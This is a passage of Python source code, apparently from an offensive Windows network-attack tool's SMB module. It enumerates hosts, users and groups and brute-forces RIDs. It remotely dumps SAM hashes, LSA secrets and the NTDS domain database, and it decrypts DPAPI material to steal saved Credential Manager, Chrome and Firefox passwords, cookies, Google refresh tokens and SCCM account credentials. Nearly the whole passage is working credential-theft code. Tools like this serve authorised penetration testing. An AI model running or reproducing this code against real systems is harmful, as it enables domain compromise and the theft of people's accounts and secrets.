                            subnetmask = None
                        interface["SubnetMask"] = subnetmask if subnetmask else None

                        # Retrieve DefaultGateway
                        try:
                            default_gateway = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, interface_handle, "DhcpDefaultGateway")[1].rstrip("\x00").replace("\x00", ", ")
                        except DCERPCException:
                            default_gateway = None
                        interface["DefaultGateway"] = default_gateway if default_gateway else None

                        self.logger.highlight(f"{interface['Name']:<11} | {interface['IPAddress']!s:<15} | {interface['SubnetMask']!s:<15} | {interface['DefaultGateway']!s:<15} | {interface['DHCP']}")

                    except DCERPCException as e:
                        self.logger.info(f"Failed to retrieve the network interface info for {sub_key}: {e!s}")

            with contextlib.suppress(Exception):
                remoteOps.finish()
        except DCERPCException as e:
            self.logger.error(f"Failed to connect to the target: {e!s}")

    def get_dc_ips(self):
        dc_ips = [dc[1] for dc in self.db.get_domain_controllers(domain=self.domain)]
        if not dc_ips:
            dc_ips.append(self.host)
        return dc_ips

    def sessions(self):
        try:
            sessions = get_netsession(
                self.host,
                self.domain,
                self.username,
                self.password,
                self.lmhash,
                self.nthash,
            )
            self.logger.display("Enumerated sessions")
            for session in sessions:
                if session.sesi10_cname.find(self.local_ip) == -1:
                    self.logger.highlight(f"{session.sesi10_cname:<25} User:{session.sesi10_username}")
            return sessions
        except Exception:
            pass

    def disks(self):
        disks = []
        try:
            disks = get_localdisks(
                self.host,
                self.domain,
                self.username,
                self.password,
                self.lmhash,
                self.nthash,
            )
            self.logger.display("Enumerated disks")
            for disk in disks:
                self.logger.highlight(disk.disk)
        except Exception as e:
            error, desc = e.getErrorString()
            self.logger.fail(
                f"Error enumerating disks: {error}",
                color="magenta" if error in smb_error_status else "red",
            )

        return disks

    def local_groups(self):
        groups = []
        # To enumerate local groups the DC IP is optional
        # if specified it will resolve the SIDs and names of any domain accounts in the local group
        for dc_ip in self.get_dc_ips():
            try:
                groups = get_netlocalgroup(
                    self.host,
                    dc_ip,
                    "",
                    self.username,
                    self.password,
                    self.lmhash,
                    self.nthash,
                    queried_groupname=self.args.local_groups,
                    list_groups=bool(not self.args.local_groups),
                    recurse=False,
                )

                if self.args.local_groups:
                    self.logger.success("Enumerated members of local group")
                else:
                    self.logger.success("Enumerated local groups")

                for group in groups:
                    if group.name:
                        if not self.args.local_groups:
                            self.logger.highlight(f"{group.name:<40} membercount: {group.membercount}")
                            group_id = self.db.add_group(
                                self.hostname,
                                group.name,
                                member_count_ad=group.membercount,
                            )[0]
                        else:
                            domain, name = group.name.split("/")
                            self.logger.highlight(f"domain: {domain}, name: {name}")
                            self.logger.highlight(f"{domain.upper()}\\{name}")
                            try:
                                group_id = self.db.get_groups(
                                    group_name=self.args.local_groups,
                                    group_domain=domain,
                                )[0][0]
                            except IndexError:
                                group_id = self.db.add_group(
                                    domain,
                                    self.args.local_groups,
                                    member_count_ad=group.membercount,
                                )[0]

                            # domain groups can be part of a local group which is also part of another local group
                            if not group.isgroup:
                                self.db.add_credential("plaintext", domain, name, "", group_id, "")
                            elif group.isgroup:
                                self.db.add_group(domain, name, member_count_ad=group.membercount)
                break
            except Exception as e:
                self.logger.fail(f"Error enumerating local groups of {self.host}: {e}")
                self.logger.display("Trying with SAMRPC protocol")
                groups = SamrFunc(self).get_local_groups()
                if groups:
                    self.logger.success("Enumerated local groups")
                    self.logger.debug(f"Local groups: {groups}")

                for group_name, group_rid in groups.items():
                    self.logger.highlight(f"rid => {group_rid} => {group_name}")
                    group_id = self.db.add_group(self.hostname, group_name, rid=group_rid)[0]
                    self.logger.debug(f"Added group, returned id: {group_id}")
        return groups

    def domainfromdsn(self, dsn):
        dsnparts = dsn.split(",")
        domain = ""
        for part in dsnparts:
            k, v = part.split("=")
            if k == "DC":
                domain = v if domain == "" else domain + "." + v
        return domain

    def domainfromdnshostname(self, dns):
        dnsparts = dns.split(".")
        domain = ".".join(dnsparts[1:])
        return domain, dnsparts[0] + "$"

    def groups(self):
        groups = []
        for dc_ip in self.get_dc_ips():
            if self.args.groups:
                try:
                    groups = get_netgroupmember(
                        dc_ip,
                        self.domain,
                        self.username,
                        password=self.password,
                        lmhash=self.lmhash,
                        nthash=self.nthash,
                        queried_groupname=self.args.groups,
                        queried_sid="",
                        queried_domain="",
                        ads_path="",
                        recurse=False,
                        use_matching_rule=False,
                        full_data=False,
                        custom_filter="",
                    )

                    self.logger.success("Enumerated members of domain group")
                    for group in groups:
                        member_count = len(group.member) if hasattr(group, "member") else 0
                        self.logger.highlight(f"{group.memberdomain}\\{group.membername}")
                        try:
                            group_id = self.db.get_groups(
                                group_name=self.args.groups,
                                group_domain=group.groupdomain,
                            )[0][0]
                        except IndexError:
                            group_id = self.db.add_group(
                                group.groupdomain,
                                self.args.groups,
                                member_count_ad=member_count,
                            )[0]
                        if not group.isgroup:
                            self.db.add_credential(
                                "plaintext",
                                group.memberdomain,
                                group.membername,
                                "",
                                group_id,
                                "",
                            )
                        elif group.isgroup:
                            group_id = self.db.add_group(
                                group.groupdomain,
                                group.groupname,
                                member_count_ad=member_count,
                            )[0]
                    break
                except Exception as e:
                    self.logger.fail(f"Error enumerating domain group members using dc ip {dc_ip}: {e}")
            else:
                try:
                    groups = get_netgroup(
                        dc_ip,
                        self.domain,
                        self.username,
                        password=self.password,
                        lmhash=self.lmhash,
                        nthash=self.nthash,
                        queried_groupname="",
                        queried_sid="",
                        queried_username="",
                        queried_domain="",
                        ads_path="",
                        admin_count=False,
                        full_data=True,
                        custom_filter="",
                    )

                    self.logger.success("Enumerated domain group(s)")
                    for group in groups:
                        member_count = len(group.member) if hasattr(group, "member") else 0
                        self.logger.highlight(f"{group.samaccountname:<40} membercount: {member_count}")

                        if bool(group.isgroup) is True:
                            # Since there isn't a groupmember attribute on the returned object from get_netgroup
                            # we grab it from the distinguished name
                            domain = self.domainfromdsn(group.distinguishedname)
                            group_id = self.db.add_group(
                                domain,
                                group.samaccountname,
                                member_count_ad=member_count,
                            )[0]
                    break
                except Exception as e:
                    self.logger.fail(f"Error enumerating domain group using dc ip {dc_ip}: {e}")
        return groups

    def users(self):
        if len(self.args.users) > 0:
            self.logger.debug(f"Dumping users: {', '.join(self.args.users)}")
        return UserSamrDump(self).dump(self.args.users)

    def computers(self):
        hosts = []
        for dc_ip in self.get_dc_ips():
            try:
                hosts = get_netcomputer(
                    dc_ip,
                    self.domain,
                    self.username,
                    password=self.password,
                    lmhash=self.lmhash,
                    nthash=self.nthash,
                    queried_domain="",
                    ads_path="",
                    custom_filter="",
                )

                self.logger.success("Enumerated domain computer(s)")
                for host in hosts:
                    domain, host_clean = self.domainfromdnshostname(host.dnshostname)
                    self.logger.highlight(f"{domain}\\{host_clean:<30}")
                break
            except Exception as e:
                self.logger.fail(f"Error enumerating domain computers using dc ip {dc_ip}: {e}")
                break
        return hosts

    def loggedon_users(self):
        logged_on = []
        try:
            logged_on = get_netloggedon(
                self.host,
                self.domain,
                self.username,
                self.password,
                lmhash=self.lmhash,
                nthash=self.nthash,
            )
            logged_on = {(f"{user.wkui1_logon_domain}\\{user.wkui1_username}", user.wkui1_logon_server) for user in logged_on}
            self.logger.success("Enumerated logged_on users")
            if self.args.loggedon_users_filter:
                for user in logged_on:
                    if re.match(self.args.loggedon_users_filter, user[0].split("\\")[1]):
                        self.logger.highlight(f"{user[0]:<25} {f'logon_server: {user[1]}'}")
            else:
                for user in logged_on:
                    self.logger.highlight(f"{user[0]:<25} {f'logon_server: {user[1]}'}")
        except Exception as e:
            self.logger.fail(f"Error enumerating logged on users: {e}")

    def pass_pol(self):
        return PassPolDump(self).dump()

    @requires_admin
    def wmi(self, wmi_query=None, namespace=None):
        records = []
        if not wmi_query:
            wmi_query = self.args.wmi.strip("\n")

        if not namespace:
            namespace = self.args.wmi_namespace

        try:
            dcom = DCOMConnection(self.remoteName, self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=True, doKerberos=self.kerberos, kdcHost=self.kdcHost, aesKey=self.aesKey, remoteHost=self.host)
            iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
            flag, stringBinding = dcom_FirewallChecker(iInterface, self.host, self.args.dcom_timeout)
            if not flag or not stringBinding:
                error_msg = f"WMI Query: Dcom initialization failed on connection with stringbinding: '{stringBinding}', please increase the timeout with the option '--dcom-timeout'. If it's still failing maybe something is blocking the RPC connection, try another exec method"

                if not stringBinding:
                    error_msg = "WMI Query: Dcom initialization failed: can't get target stringbinding, maybe cause by IPv6 or any other issues, please check your target again"

                self.logger.fail(error_msg) if not flag else self.logger.debug(error_msg)
                # Make it force break function
                dcom.disconnect()
            iWbemLevel1Login = IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
            iWbemLevel1Login.RemRelease()
            iEnumWbemClassObject = iWbemServices.ExecQuery(wmi_query)
        except Exception as e:
            self.logger.fail(f"Execute WQL error: {e}")
            if "iWbemLevel1Login" in locals():
                dcom.disconnect()
        else:
            self.logger.info(f"Executing WQL syntax: {wmi_query}")
            while True:
                try:
                    wmi_results = iEnumWbemClassObject.Next(0xFFFFFFFF, 1)[0]
                    record = wmi_results.getProperties()
                    records.append(record)
                    for k, v in record.items():
                        if k != "TimeGenerated":  # from the wcc module, but this is a small hack to get it to stop spamming - TODO: add in method to disable output for this function
                            self.logger.highlight(f"{k} => {v['value']}")
                except Exception as e:
                    if str(e).find("S_FALSE") < 0:
                        raise e
                    else:
                        break
            dcom.disconnect()
        return records if records else False

    def spider(
        self,
        share=None,
        folder=".",
        pattern=None,
        regex=None,
        exclude_dirs=None,
        depth=None,
        content=False,
        only_files=True,
    ):
        if exclude_dirs is None:
            exclude_dirs = []
        if regex is None:
            regex = []
        if pattern is None:
            pattern = []
        spider = SMBSpider(self.conn, self.logger)

        self.logger.display("Started spidering")
        start_time = time()
        if not share:
            spider.spider(
                self.args.spider,
                self.args.spider_folder,
                self.args.pattern,
                self.args.regex,
                self.args.exclude_dirs,
                self.args.depth,
                self.args.content,
                self.args.only_files,
            )
        else:
            spider.spider(share, folder, pattern, regex, exclude_dirs, depth, content, only_files)

        self.logger.display(f"Done spidering (Completed in {time() - start_time})")

        return spider.results

    def rid_brute(self, max_rid=None):
        entries = []
        if not max_rid:
            max_rid = int(self.args.rid_brute)

        KNOWN_PROTOCOLS = {
            135: {"bindstr": rf"ncacn_ip_tcp:{self.host}"},
            139: {"bindstr": rf"ncacn_np:{self.host}[\pipe\lsarpc]"},
            445: {"bindstr": rf"ncacn_np:{self.host}[\pipe\lsarpc]"},
        }

        try:
            string_binding = KNOWN_PROTOCOLS[self.port]["bindstr"]
            logging.debug(f"StringBinding {string_binding}")
            rpc_transport = transport.DCERPCTransportFactory(string_binding)
            rpc_transport.setRemoteHost(self.host)

            if hasattr(rpc_transport, "set_credentials"):
                # This method exists only for selected protocol sequences.
                rpc_transport.set_credentials(self.username, self.password, self.domain, self.lmhash, self.nthash, self.aesKey)

            if self.kerberos:
                rpc_transport.set_kerberos(self.kerberos, self.kdcHost)

            dce = rpc_transport.get_dce_rpc()
            if self.kerberos:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)

            dce.connect()
        except Exception as e:
            self.logger.fail(f"Error creating DCERPC connection: {e}")
            return entries

        # Want encryption? Uncomment next line
        # But make simultaneous variable <= 100

        # Want fragmentation? Uncomment next line

        dce.bind(lsat.MSRPC_UUID_LSAT)
        try:
            resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
        except lsad.DCERPCSessionError as e:
            self.logger.fail(f"Error connecting: {e}")
            return entries

        policy_handle = resp["PolicyHandle"]

        resp = lsad.hLsarQueryInformationPolicy2(
            dce,
            policy_handle,
            lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation,
        )
        domain_sid = resp["PolicyInformation"]["PolicyAccountDomainInfo"]["DomainSid"].formatCanonical()

        so_far = 0
        simultaneous = 1000
        for _j in range(max_rid // simultaneous + 1):
            sids_to_check = (max_rid - so_far) % simultaneous if (max_rid - so_far) // simultaneous == 0 else simultaneous

            if sids_to_check == 0:
                break

            sids = [f"{domain_sid}-{i:d}" for i in range(so_far, so_far + sids_to_check)]
            try:
                lsat.hLsarLookupSids(dce, policy_handle, sids, lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
            except DCERPCException as e:
                if str(e).find("STATUS_NONE_MAPPED") >= 0:
                    so_far += simultaneous
                    continue
                elif str(e).find("STATUS_SOME_NOT_MAPPED") >= 0:
                    resp = e.get_packet()
                else:
                    raise

            for n, item in enumerate(resp["TranslatedNames"]["Names"]):
                if item["Use"] != SID_NAME_USE.SidTypeUnknown:
                    rid = so_far + n
                    domain = resp["ReferencedDomains"]["Domains"][item["DomainIndex"]]["Name"]
                    user = item["Name"]
                    sid_type = SID_NAME_USE.enumItems(item["Use"]).name
                    self.logger.highlight(f"{rid}: {domain}\\{user} ({sid_type})")
                    entries.append(
                        {
                            "rid": rid,
                            "domain": domain,
                            "username": user,
                            "sidtype": sid_type,
                        }
                    )
            so_far += simultaneous
        dce.disconnect()
        return entries

    def put_file_single(self, src, dst):
        self.logger.display(f"Copying {src} to {dst}")
        with open(src, "rb") as file:
            try:
                self.conn.putFile(self.args.share, dst, file.read)
                self.logger.success(f"Created file {src} on \\\\{self.args.share}\\{dst}")
            except Exception as e:
                self.logger.fail(f"Error writing file to share {self.args.share}: {e}")

    def put_file(self):
        for src, dest in self.args.put_file:
            self.put_file_single(src, dest)

    def get_file_single(self, remote_path, download_path):
        share_name = self.args.share
        self.logger.display(f'Copying "{remote_path}" to "{download_path}"')
        if self.args.append_host:
            download_path = f"{self.hostname}-{remote_path}"
        with open(download_path, "wb+") as file:
            try:
                self.conn.getFile(share_name, remote_path, file.write)
                self.logger.success(f'File "{remote_path}" was downloaded to "{download_path}"')
            except Exception as e:
                self.logger.fail(f'Error writing file "{remote_path}" from share "{share_name}": {e}')
                if os.path.getsize(download_path) == 0:
                    os.remove(download_path)

    def get_file(self):
        for src, dest in self.args.get_file:
            self.get_file_single(src, dest)

    def enable_remoteops(self):
        try:
            self.remote_ops = RemoteOperations(self.conn, self.kerberos, self.kdcHost)
            self.remote_ops.enableRegistry()
            if self.bootkey is None:
                self.bootkey = self.remote_ops.getBootKey()
        except Exception as e:
            self.logger.fail(f"RemoteOperations failed: {e}")

    @requires_admin
    def sam(self):
        try:
            self.enable_remoteops()
            host_id = self.db.get_hosts(filter_term=self.host)[0][0]

            def add_sam_hash(sam_hash, host_id):
                add_sam_hash.sam_hashes += 1
                self.logger.highlight(sam_hash)
                username, _, lmhash, nthash, _, _, _ = sam_hash.split(":")
                self.db.add_credential(
                    "hash",
                    self.hostname,
                    username,
                    f"{lmhash}:{nthash}",
                    pillaged_from=host_id,
                )

            add_sam_hash.sam_hashes = 0

            if self.remote_ops and self.bootkey:
                SAM_file_name = self.remote_ops.saveSAM()
                SAM = SAMHashes(
                    SAM_file_name,
                    self.bootkey,
                    isRemote=True,
                    perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
                )

                self.logger.display("Dumping SAM hashes")
                SAM.dump()
                SAM.export(self.output_filename)
                self.logger.success(f"Added {highlight(add_sam_hash.sam_hashes)} SAM hashes to the database")

                try:
                    self.remote_ops.finish()
                except Exception as e:
                    self.logger.debug(f"Error calling remote_ops.finish(): {e}")
                SAM.finish()
        except SessionError as e:
            if "STATUS_ACCESS_DENIED" in e.getErrorString():
                self.logger.fail('Error "STATUS_ACCESS_DENIED" while dumping SAM. This is likely due to an endpoint protection.')
        except Exception as e:
            self.logger.exception(str(e))

    @requires_admin
    def sccm(self):
        masterkeys = []
        if self.args.mkfile is not None:
            try:
                masterkeys += parse_masterkey_file(self.args.mkfile)
            except Exception as e:
                self.logger.fail(str(e))

        target = Target.create(
            domain=self.domain,
            username=self.username,
            password=self.password,
            target=self.hostname + "." + self.domain if self.kerberos else self.host,
            lmhash=self.lmhash,
            nthash=self.nthash,
            do_kerberos=self.kerberos,
            aesKey=self.aesKey,
            no_pass=True,
            use_kcache=self.use_kcache,
        )

        try:
            conn = DPLootSMBConnection(target)
            conn.smb_session = self.conn
        except Exception as e:
            self.logger.debug(f"Could not upgrade connection: {e}")
            return

        try:
            self.logger.display("Collecting Machine masterkeys, grab a coffee and be patient...")
            masterkeys_triage = MasterkeysTriage(
                target=target,
                conn=conn,
                dpapiSystem={},
            )
            masterkeys += masterkeys_triage.triage_system_masterkeys()
        except Exception as e:
            self.logger.debug(f"Could not get masterkeys: {e}")

        if len(masterkeys) == 0:
            self.logger.fail("No masterkeys looted")
            return

        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting SCCM Credentials through {self.args.sccm}")
        try:
            # Collect Chrome Based Browser stored secrets
            sccm_triage = SCCMTriage(target=target, conn=conn, masterkeys=masterkeys, use_wmi=self.args.sccm == "wmi")
            sccmcreds, sccmtasks, sccmcollections = sccm_triage.triage_sccm()
            for sccmcred in sccmcreds:
                self.logger.highlight(f"[NAA Account] {sccmcred.username.decode('latin-1')}:{sccmcred.password.decode('latin-1')}")
            for sccmtask in sccmtasks:
                self.logger.highlight(f"[Task sequences secret] {sccmtask.secret.decode('latin-1')}")
            for sccmcollection in sccmcollections:
                self.logger.highlight(f"[Collection Variable] {sccmcollection.variable.decode('latin-1')}:{sccmcollection.value.decode('latin-1')}")
        except Exception as e:
            self.logger.debug(f"Error while looting sccm: {e}")

    @requires_admin
    def dpapi(self):
        dump_system = "nosystem" not in self.args.dpapi

        if self.args.pvk is not None:
            try:
                self.pvkbytes = open(self.args.pvk, "rb").read()  # noqa: SIM115
                self.logger.success(f"Loading domain backupkey from {self.args.pvk}")
            except Exception as e:
                self.logger.fail(str(e))

        masterkeys = []
        if self.args.mkfile is not None:
            try:
                masterkeys += parse_masterkey_file(self.args.mkfile)
            except Exception as e:
                self.logger.fail(str(e))

        if self.pvkbytes is None and self.no_da is None and self.args.local_auth is False:
            try:
                results = self.db.get_domain_backupkey(self.domain)
            except Exception:
                self.logger.fail(
                    "Your version of nxcdb is not up to date, run nxcdb and create a new workspace: \
                    'workspace create dpapi' then re-run the dpapi option"
                )
                return False
            if len(results) > 0:
                self.logger.success("Loading domain backupkey from nxcdb...")
                self.pvkbytes = results[0][2]
            else:
                try:
                    dc_target = Target.create(
                        domain=self.domain,
                        username=self.username,
                        password=self.password,
                        target=self.domain,  # querying DNS server for domain will return DC
                        lmhash=self.lmhash,
                        nthash=self.nthash,
                        do_kerberos=self.kerberos,
                        aesKey=self.aesKey,
                        no_pass=True,
                        use_kcache=self.use_kcache,
                    )
                    dc_conn = DPLootSMBConnection(dc_target)
                    dc_conn.connect()  # Connect to DC
                    if dc_conn.is_admin():
                        self.logger.success("User is Domain Administrator, exporting domain backupkey...")
                        backupkey_triage = BackupkeyTriage(target=dc_target, conn=dc_conn)
                        backupkey = backupkey_triage.triage_backupkey()
                        self.pvkbytes = backupkey.backupkey_v2
                        self.db.add_domain_backupkey(self.domain, self.pvkbytes)
                    else:
                        self.no_da = False
                except Exception as e:
                    self.logger.fail(f"Could not get domain backupkey: {e}")

        target = Target.create(
            domain=self.domain,
            username=self.username,
            password=self.password,
            target=self.hostname + "." + self.domain if self.kerberos else self.host,
            lmhash=self.lmhash,
            nthash=self.nthash,
            do_kerberos=self.kerberos,
            aesKey=self.aesKey,
            no_pass=True,
            use_kcache=self.use_kcache,
        )

        try:
            conn = DPLootSMBConnection(target)
            conn.smb_session = self.conn
        except Exception as e:
            self.logger.debug(f"Could not upgrade connection: {e}")
            return None

        plaintexts = {username: password for _, _, username, password, _, _ in self.db.get_credentials(cred_type="plaintext")}
        nthashes = {username: nt.split(":")[1] if ":" in nt else nt for _, _, username, nt, _, _ in self.db.get_credentials(cred_type="hash")}
        if self.password != "":
            plaintexts[self.username] = self.password
        if self.nthash != "":
            nthashes[self.username] = self.nthash

        # Collect User and Machine masterkeys
        try:
            self.logger.display("Collecting User and Machine masterkeys, grab a coffee and be patient...")
            masterkeys_triage = MasterkeysTriage(
                target=target,
                conn=conn,
                pvkbytes=self.pvkbytes,
                passwords=plaintexts,
                nthashes=nthashes,
                dpapiSystem={},
            )
            self.logger.debug(f"Masterkeys Triage: {masterkeys_triage}")
            masterkeys += masterkeys_triage.triage_masterkeys()
            if dump_system:
                masterkeys += masterkeys_triage.triage_system_masterkeys()
        except Exception as e:
            self.logger.debug(f"Could not get masterkeys: {e}")

        if len(masterkeys) == 0:
            self.logger.fail("No masterkeys looted")
            return None

        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting secrets...")

        credentials = []
        system_credentials = []
        try:
            # Collect User and Machine Credentials Manager secrets
            credentials_triage = CredentialsTriage(target=target, conn=conn, masterkeys=masterkeys)
            self.logger.debug(f"Credentials Triage Object: {credentials_triage}")
            credentials = credentials_triage.triage_credentials()
            self.logger.debug(f"Triaged Credentials: {credentials}")
            if dump_system:
                system_credentials = credentials_triage.triage_system_credentials()
                self.logger.debug(f"Triaged System Credentials: {system_credentials}")
        except Exception as e:
            self.logger.debug(f"Error while looting credentials: {e}")

        for credential in credentials:
            self.logger.highlight(f"[{credential.winuser}][CREDENTIAL] {credential.target} - {credential.username}:{credential.password}")
            self.db.add_dpapi_secrets(
                target.address,
                "CREDENTIAL",
                credential.winuser,
                credential.username,
                credential.password,
                credential.target,
            )
        for credential in system_credentials:
            self.logger.highlight(f"[SYSTEM][CREDENTIAL] {credential.target} - {credential.username}:{credential.password}")
            self.db.add_dpapi_secrets(
                target.address,
                "CREDENTIAL",
                "SYSTEM",
                credential.username,
                credential.password,
                credential.target,
            )

        browser_credentials = []
        cookies = []
        try:
            # Collect Chrome Based Browser stored secrets
            dump_cookies = "cookies" in self.args.dpapi
            browser_triage = BrowserTriage(target=target, conn=conn, masterkeys=masterkeys)
            browser_credentials, cookies = browser_triage.triage_browsers(gather_cookies=dump_cookies)
        except Exception as e:
            self.logger.debug(f"Error while looting browsers: {e}")
        for credential in browser_credentials:
            if isinstance(credential, LoginData):
                cred_url = credential.url + " -" if credential.url != "" else "-"
                self.logger.highlight(f"[{credential.winuser}][{credential.browser.upper()}] {cred_url} {credential.username}:{credential.password}")
                self.db.add_dpapi_secrets(
                    target.address,
                    credential.browser.upper(),
                    credential.winuser,
                    credential.username,
                    credential.password,
                    credential.url,
                )
            elif isinstance(credential, GoogleRefreshToken):
                self.logger.highlight(f"[{credential.winuser}][{credential.browser.upper()}] Google Refresh Token: {credential.service}:{credential.token}")
                self.db.add_dpapi_secrets(
                    target.address,
                    credential.browser.upper(),
                    credential.winuser,
                    credential.service,
                    credential.token,
                    "Google Refresh Token",
                )

        if dump_cookies and cookies:
            self.logger.display("Start Dumping Cookies")
            for cookie in cookies:
                if cookie.cookie_value != "":
                    self.logger.highlight(f"[{cookie.winuser}][{cookie.browser.upper()}] {cookie.host}{cookie.path} - {cookie.cookie_name}:{cookie.cookie_value}")
            self.logger.display("End Dumping Cookies")
        elif dump_cookies:
            self.logger.fail("No cookies found")

        vaults = []
        try:
            # Collect User Internet Explorer stored secrets
            vaults_triage = VaultsTriage(target=target, conn=conn, masterkeys=masterkeys)
            vaults = vaults_triage.triage_vaults()
        except Exception as e:
            self.logger.debug(f"Error while looting vaults: {e}")
        for vault in vaults:
            if vault.type == "Internet Explorer":
                resource = vault.resource + " -" if vault.resource != "" else "-"
                self.logger.highlight(f"[{vault.winuser}][IEX] {resource} - {vault.username}:{vault.password}")
                self.db.add_dpapi_secrets(
                    target.address,
                    "IEX",
                    vault.winuser,
                    vault.username,
                    vault.password,
                    vault.resource,
                )

        firefox_credentials = []
        try:
            # Collect Firefox stored secrets
            firefox_triage = FirefoxTriage(target=target, logger=self.logger, conn=conn)
            firefox_credentials = firefox_triage.run()
        except Exception as e:
            self.logger.debug(f"Error while looting firefox: {e}")
        for credential in firefox_credentials:
            url = credential.url + " -" if credential.url != "" else "-"
            self.logger.highlight(f"[{credential.winuser}][FIREFOX] {url} {credential.username}:{credential.password}")
            self.db.add_dpapi_secrets(
                target.address,
                "FIREFOX",
                credential.winuser,
                credential.username,
                credential.password,
                credential.url,
            )

        if not (credentials or system_credentials or browser_credentials or cookies or vaults or firefox_credentials):
            self.logger.fail("No secrets found")

    @requires_admin
    def lsa(self):
        try:
            self.enable_remoteops()

            def add_lsa_secret(secret):
                add_lsa_secret.secrets += 1
                self.logger.highlight(secret)
                if "_SC_GMSA_{84A78B8C" in secret:
                    gmsa_id = secret.split("_")[4].split(":")[0]
                    data = bytes.fromhex(secret.split("_")[4].split(":")[1])
                    blob = MSDS_MANAGEDPASSWORD_BLOB()
                    blob.fromString(data)
                    currentPassword = blob["CurrentPassword"][:-2]
                    ntlm_hash = MD4.new()
                    ntlm_hash.update(currentPassword)
                    passwd = binascii.hexlify(ntlm_hash.digest()).decode("utf-8")
                    self.logger.highlight(f"GMSA ID: {gmsa_id:<20} NTLM: {passwd}")

            add_lsa_secret.secrets = 0

            if self.remote_ops and self.bootkey:
                SECURITYFileName = self.remote_ops.saveSECURITY()
                LSA = LSASecrets(
                    SECURITYFileName,
                    self.bootkey,
                    self.remote_ops,
                    isRemote=True,
                    perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
                )
                self.logger.success("Dumping LSA secrets")
                LSA.dumpCachedHashes()
                LSA.exportCached(self.output_filename)
                LSA.dumpSecrets()
                LSA.exportSecrets(self.output_filename)
                self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {self.output_filename + '.secrets'} and {self.output_filename + '.cached'}")
                try:
                    self.remote_ops.finish()
                except Exception as e:
                    self.logger.debug(f"Error calling remote_ops.finish(): {e}")
                LSA.finish()
        except SessionError as e:
            if "STATUS_ACCESS_DENIED" in e.getErrorString():
                self.logger.fail('Error "STATUS_ACCESS_DENIED" while dumping LSA. This is likely due to an endpoint protection.')
        except Exception as e:
            self.logger.exception(str(e))

    def ntds(self):
        self.enable_remoteops()
        use_vss_method = False
        NTDSFileName = None
        host_id = self.db.get_hosts(filter_term=self.host)[0][0]

        def add_ntds_hash(ntds_hash, host_id):
            add_ntds_hash.ntds_hashes += 1
            if self.args.enabled:
                if "Enabled" in ntds_hash:
                    ntds_hash = " ".join(ntds_hash.split(" ")[:-1])
                    self.logger.highlight(ntds_hash)
            else:
                ntds_hash = " ".join(ntds_hash.split(" ")[:-1])
                self.logger.highlight(ntds_hash)
            if ntds_hash.find("$") == -1:
                if ntds_hash.find("\\") != -1:
                    domain, clean_hash = ntds_hash.split("\\")
                else:
                    domain = self.domain
                    clean_hash = ntds_hash

                try:
                    username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
                    parsed_hash = f"{lmhash}:{nthash}"
                    if validate_ntlm(parsed_hash):
                        self.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
                        add_ntds_hash.added_to_db += 1
                        return
                    raise
                except Exception:
                    self.logger.debug("Dumped hash is not NTLM, not adding to db for now ;)")
            else:
                self.logger.debug("Dumped hash is a computer account, not adding to db")

        add_ntds_hash.ntds_hashes = 0
        add_ntds_hash.added_to_db = 0

        if self.remote_ops:
            try:
                if self.args.ntds == "vss":
                    NTDSFileName = self.remote_ops.saveNTDS()
                    use_vss_method = True

            except Exception as e:
                # if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                # We don't store the resume file if this error happened, since this error is related to lack
                # of enough privileges to access DRSUAPI.
                #    if resumeFile is not None:
                self.logger.fail(e)
            if self.args.ntds == "raw":
                try:
                    RawNTDSCopy(logger=self.logger, connection=self.conn,execute=self.execute,host=self.host,db=self.db,domain=self.domain,output_filename=self.output_filename)
                except Exception as e:
                    self.logger.fail(e)
                return
        NTDS = NTDSHashes(
            NTDSFileName,
            self.bootkey,
            isRemote=True,
            history=False,
            noLMHash=True,
            remoteOps=self.remote_ops,
            useVSSMethod=use_vss_method,
            justNTLM=True,
            pwdLastSet=False,
            resumeSession=None,
            outputFileName=self.output_filename,
            justUser=self.args.userntds if self.args.userntds else None,
            printUserStatus=True,
            perSecretCallback=lambda secret_type, secret: add_ntds_hash(secret, host_id),
        )

        try:
            self.logger.success("Dumping the NTDS, this could take a while so go grab a redbull...")
            NTDS.dump()
            ntds_outfile = f"{self.output_filename}.ntds"
            self.logger.success(f"Dumped {highlight(add_ntds_hash.ntds_hashes)} NTDS hashes to {ntds_outfile} of which {highlight(add_ntds_hash.added_to_db)} were added to the database")
            self.logger.display("To extract only enabled accounts from the output file, run the following command: ")
            self.logger.display(f"cat {ntds_outfile} | grep -iv disabled | cut -d ':' -f1")
            self.logger.display(f"grep -iv disabled {ntds_outfile} | cut -d ':' -f1")
        except Exception as e:
            # if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
            # We don't store the resume file if this error happened, since this error is related to lack
            # of enough privileges to access DRSUAPI.
            #    if resumeFile is not None:
            self.logger.fail(e)
        try:
            self.remote_ops.finish()
        except Exception as e:
            self.logger.debug(f"Error calling remote_ops.finish(): {e}")
        NTDS.finish()

    def mark_guest(self):
        return highlight(f"{highlight('(Guest)')}" if self.is_guest else "")
